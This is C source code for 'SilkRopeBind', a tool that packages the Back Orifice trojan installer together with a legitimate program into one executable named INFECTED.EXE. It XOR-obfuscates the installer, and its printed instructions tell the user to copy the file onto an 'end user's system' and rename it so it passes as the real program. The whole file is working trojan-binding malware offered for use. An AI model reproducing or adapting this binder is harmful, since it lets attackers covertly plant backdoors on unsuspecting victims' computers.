/////////////////////////////////////////////////////////////////
// SilkRopeBind.c
// version 1.1
//  A program to package your BO installer and a seperate program
//  into a single file.  
//
// SilkRope is:
//  A Back Orifice goodie -- used to launch a copy of the Back
//  Orifice installer before running a "real" program.  A copy
//  of the installer is used so that the packaged installer
//  is not deleted upon execution.
//  This is similar to, but more elegant than, the SaranWrap
//  goodie.  While SaranWrap uses multiple files, SilkRope
//  bundles everything into a single innocent little file.
/////////////////////////////////////////////////////////////////
// Added: Simple XOR encryption

#include <windows.h>
#include <stdio.h>
#include <time.h>

#define STUB_DATA "SilkRope.DAT"

/////////////////////////////////////////////////////////////////
// Global Defines
//#define FIRST_OFFSET 110000
#define FIRST_OFFSET 42000
    // The offset into this executable where the first file is located
    // Each file starts with an unsigned long that specifies the file's
	// size.  Then comes the contents of the file.  After that is EOF or
    // another ulong for the next file.

    // There are two files bundled in this executable.  First (at offset
    // FIRST_OFFSET), is the BO installer.  Second, is the "real"
    // application.

/////////////////////////////////////////////////////////////////
// bind -- bind the two files into an executable
// temporary directory.
int bind(char *BOInstaller, char *real)
{
	FILE *input;
	FILE *output;
	unsigned long len;
	BYTE *buffer;
	int size;
	int i;
	BYTE cryptoKey;
	
	//Verify parameters
	if ((BOInstaller==NULL) || (*BOInstaller==0)
		|| (real==NULL) || (*real==0))
	{
		printf("Error while binding with Silk Rope: One or more file names were not specified\n");
		return 0;
	}
	//Open the output file + position (add/truncate data)
	output = fopen("infected.exe", "wb");
	if (!output)
	{
		printf("Error opening output file\n");
		return 0;
	}
	//Insert the stub
	input = fopen(STUB_DATA, "rb");
	if (!input)
	{
		printf("Error reading stub data file %s\n", STUB_DATA);
		return 0;
	}
	fseek(input, 0, SEEK_SET);
	buffer = (BYTE *)malloc(4096);
	while (!feof(input))
	{
		size = 4096;
		size = fread(buffer, 1, size, input);
		fwrite(buffer, 1, size, output);
	}
	fclose(input);
	//Insert padding
	fseek(output, 0, SEEK_END);
	len = ftell(output);
	if (len < FIRST_OFFSET)
	{
		//Pad out the length....
		len = FIRST_OFFSET - len;
		buffer = (BYTE *)malloc(1024);
		memset(buffer, 0, 1024);
		while (len > 0)
		{
			if (len > 1024) size = 1024; else size = len;
			fwrite(buffer, 1, size, output);
			len -= size;
		}
		free(buffer);
	}else if (len > FIRST_OFFSET)
	{
		//Move to the beginning of embedded data
		fseek(output, FIRST_OFFSET, SEEK_SET);
		//Truncate the remainder...?
	}

	buffer = (BYTE *)malloc(4096);

	//Open the first input file (Back Orifice)
	input = fopen(BOInstaller, "rb");
	if (!input)
	{
		printf("Error opening BO Installer file %s", BOInstaller);
		return 0;
	}
	//Get len
	fseek(input, 0, SEEK_END);
	len = ftell(input);
	fwrite(&len, 1, sizeof(len), output);
	//Generate an 8-bit key
	cryptoKey = (rand() % 253)+1;
	fwrite(&cryptoKey, 1, sizeof(cryptoKey), output);
	fseek(input, 0, SEEK_SET);
	size = 1;
	while (len && size && !feof(input))
	{
		if (len > 4096) size = 4096; else size = len;
		size = fread(buffer, 1, size, input);
		//Simple XOR encryption
		for (i=0; i<size; i++)
			buffer[i] ^= cryptoKey;
		fwrite(buffer, 1, size, output);
		len -= size;
	}
	fclose(input);
	
	//Open the second input file
	input = fopen(real, "rb");
	if (!input)
	{
		printf("Error opening real program file %s", real);
		return 0;
	}
	//Get len
	fseek(input, 0, SEEK_END);
	len = ftell(input);
	fwrite(&len, 1, sizeof(len), output);
	fseek(input, 0, SEEK_SET);
	size = 1;
	while (len && size && !feof(input))
	{
		if (len > 4096) size = 4096; else size = len;
		size = fread(buffer, 1, size, input);
		fwrite(buffer, 1, size, output);
		len -= size;
	}
	fclose(input);
	free(buffer);
	fclose(output);
	return 1;
}

/////////////////////////////////////////////////////////////////
// fixUp -- Truncates at "\r" or "\n" (which sometimes fgets leaves
// floating around)
void fixUp(char *s)
{
	if (!s)
		return;
	while (*s)
	{
		if ((*s=='\r')||(*s=='\n'))
			*s = 0;
		else
			*s++;
	}
}

/////////////////////////////////////////////////////////////////
// Main
int main( int argc, char *argv[ ])
{
	char BOInstaller[255];
	char realProgram[255];

	srand( (unsigned)time( NULL ) );
	printf("SilkRopeBind -- Binds the BO Installer to a \"real\" program\n");
	printf(" by Brian Enigma <enigma@netninja.com>\n\n");
	printf("BO_INSTALLER + REAL_PROGRAM --> INFECTED.EXE\n");
	printf("File name of your Back Orifice installer? [defaults to BOSERVE.EXE]\n");
	fgets(BOInstaller, 254, stdin); fixUp(BOInstaller);
	if (BOInstaller[0]==0) {strcpy(BOInstaller, "BOSERVE.EXE"); printf("BOSERVE.EXE\n");}
	printf("File name of the \"real\" program to be run?\n(it will not be modified in any way, only copied into INFECTED.EXE\n");
	fgets(realProgram, 254, stdin); fixUp(realProgram);
	if (bind(BOInstaller, realProgram))
	{
		printf("INFECTED.EXE now appears, to the end user, to be %s.\n", realProgram);
		printf("You will want to copy it to the end user's system, then\n");
		printf("rename it to %s\n", realProgram);
	}
	return 0;
}
